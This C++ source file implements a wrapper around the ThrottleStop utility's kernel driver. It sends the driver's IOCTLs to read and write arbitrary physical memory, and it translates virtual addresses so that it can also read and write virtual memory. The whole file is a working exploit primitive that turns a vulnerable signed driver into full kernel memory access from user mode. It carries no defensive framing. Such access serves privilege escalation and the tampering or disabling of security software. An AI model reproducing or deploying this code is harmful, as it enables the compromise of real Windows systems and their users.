#include <throttlestop.h>

NTSTATUS ThrottleStopLayer::Initialize() {
	dev_handle = CreateFileW(dev_name.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (!dev_handle) return GetLastError();
	return 0;
}

NTSTATUS ThrottleStopLayer::Finalize() {
	if (dev_handle) CloseHandle(dev_handle);
	return 0;
}

NTSTATUS ThrottleStopLayer::ReadPhysicalMemory(PVOID64 memptr, PVOID64 out_buffer, LONG64 size) {
	DWORD ret = NULL, BytesRead = NULL;
	ULONG64 source_ptr = (ULONG64)memptr;
	ULONG64 target_ptr = (ULONG64)out_buffer;
	while (BytesRead < size)
	{
		SIZE_T ChunkSize = min(size - BytesRead, 8);
		BOOL bResult = DeviceIoControl(dev_handle,
			read_pmem_ioctl,
			&source_ptr, sizeof(source_ptr),
			(PVOID64)target_ptr, (DWORD)ChunkSize,
			&ret, NULL);
		if (!bResult) return GetLastError();

		source_ptr += ChunkSize;
		target_ptr += ChunkSize;
		BytesRead += ChunkSize;
	}
	return 0;
}

NTSTATUS ThrottleStopLayer::WritePhysicalMemory(PVOID64 input_buffer, PVOID64 memptr, LONG64 size) {
	DWORD ret = NULL, BytesWritten = NULL;
	TS_WRITE_PMEM req = {};
	ULONG64 source_ptr = (ULONG64)input_buffer;
	ULONG64 target_ptr = (ULONG64)memptr;
	while (BytesWritten < size)
	{
		SIZE_T ChunkSize = min(size - BytesWritten, 8);

		req.PhysicalAddress = target_ptr + BytesWritten;
		memcpy(req.Data, (PVOID64)(source_ptr + BytesWritten), ChunkSize);
		BOOL bResult = DeviceIoControl(dev_handle,
			write_pmem_ioctl,
			&req, 8 + ChunkSize,
			NULL, NULL,
			&ret, NULL);
		if (!bResult) return GetLastError();
		BytesWritten += ChunkSize;
	}
	return 0;
}

NTSTATUS ThrottleStopLayer::ReadVirtualMemory(PVOID64 memptr, PVOID64 out_buffer, LONG64 size) {
	spf2::memory_map mm;
	if (!spf2::spf_mm_current(&mm)){
		return GetLastError();
}
	PVOID64 phys_memptr = (PVOID64)spf2::spf_mm_translate(&mm, memptr);
	spf2::spf_mm_free(&mm);
	return ReadPhysicalMemory(phys_memptr, out_buffer, size);
}

NTSTATUS ThrottleStopLayer::WriteVirtualMemory(PVOID64 input_buffer, PVOID64 memptr, LONG64 size) {
	spf2::memory_map mm;
	if (!spf2::spf_mm_current(&mm)) return GetLastError();
	PVOID64 phys_memptr = (PVOID64)spf2::spf_mm_translate(&mm, memptr);
	spf2::spf_mm_free(&mm);
	return WritePhysicalMemory(input_buffer, phys_memptr, size);
}